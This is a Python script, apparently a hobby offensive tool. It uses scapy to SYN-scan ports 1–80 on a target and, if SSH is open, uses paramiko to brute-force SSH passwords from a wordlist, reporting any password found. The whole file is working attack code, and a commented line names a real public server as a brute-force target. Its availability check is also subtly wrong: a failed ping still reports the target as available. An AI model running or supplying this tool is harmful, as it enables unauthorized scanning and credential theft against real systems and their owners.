from scapy.all import *
from scapy.layers.inet import IP, TCP, ICMP
from scapy.volatile import RandShort
import paramiko


def scanport(target, port):
    sport = RandShort()
    conf.verb = 0
    print("Trying port", port)   
    synPkt = sr1(
        IP(dst=target)/TCP(sport=sport, dport=port, flags="S", options=[('Timestamp', (0, 0))]), timeout=0.5, verbose=0
                 )
    if synPkt != None:
        if synPkt.haslayer(TCP):
            if synPkt[TCP].flags == 0x12:   #use hex
                sr(IP(dst=target)/TCP(sport=sport, dport=port, flags="R"), timeout=2)
                return True
    return False
    

def is_target_available(target):
    conf.verb = 0
    try:
        ping = sr1(IP(dst=target)/ICMP(), timeout=3)
        print("Target is available")
        return True
    except:
        print("Target not responding")
        return False


def ssh_bruteforce(target, target_port):
    with open("PasswordList.txt") as fp:
        passwords = [line.strip() for line in fp]
        user = input("Enter SSH login to use: ")
        SSHclient = paramiko.SSHClient()
        SSHclient.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        SSHclient.load_system_host_keys()

        for pwd in passwords:
            print("Trying authentication with : ", user, "  ", pwd)
            try:
                SSHclient.connect(target, port=int(target_port), username=user, password=pwd, timeout=5)
                print("Password FOUND: ", pwd)
                SSHclient.close()
                break
            except socket.timeout:
                print("SSH connection timed out")
            except paramiko.ssh_exception.NoValidConnectionsError:
                print("[!] Connection error")
                exit()
            except paramiko.ssh_exception.AuthenticationException:
                print("[-] Invalid credentials!")
            
            
# ssh_bruteforce("tty.sdf.org", 22)
target = input("Enter target IP/hostname: ")
registered_ports = range(1, 81)
open_ports = []

if is_target_available(target):
    for port in registered_ports:
        port_status = scanport(target, port)
        if port_status:
            open_ports.append(port)
            print("Port: ", port, "is open")

    print("Port scan completed")
    print("Open ports are: ", open_ports)

    if 22 in open_ports:
        run_bruteforce = input("Port 22 is OPEN. Do you want to perform a bruteforce attack? [yes|no]\r\n")
        run_bruteforce = run_bruteforce.strip().lower()
        if run_bruteforce == 'yes':
            ssh_bruteforce(target, 22)
